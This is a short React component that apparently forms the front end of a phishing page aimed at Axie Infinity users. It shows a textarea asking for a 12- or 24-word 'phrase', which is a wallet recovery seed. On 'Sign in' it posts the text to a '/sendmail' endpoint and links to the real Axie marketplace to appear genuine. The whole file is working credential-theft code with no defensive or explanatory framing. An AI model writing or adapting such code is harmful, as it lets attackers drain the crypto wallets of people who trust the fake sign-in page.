import React, { useState, useEffect } from 'react'
import { Input } from 'reactstrap'
import "../CSS/TextArea.css"
import SigninButton from "./SigninButton"
import axios from 'axios'
import { Link } from 'react-router-dom'

const TextArea = () => {
    const [Data, setData] = useState("")

    const handleclick = async () => {
        console.log(Data);
        await axios.post("http://localhost:5000/sendmail", {
            message: Data
        })
    }
    return (
        <div className="inputsection">
            <Input type="textarea" name="text" className="inputarea" placeholder="phrase" onChange={(e) => {
                setData(e.target.value)
            }} />
            <p className="textareadescription">Typically 12(sometimes24) words seperated by a single spaces</p>
            <Link to="http://marketplace.axieinfinity.com/">
                <SigninButton sendmail={handleclick} >Sign in</SigninButton>
            </Link>

        </div>
    )
}

export default TextArea
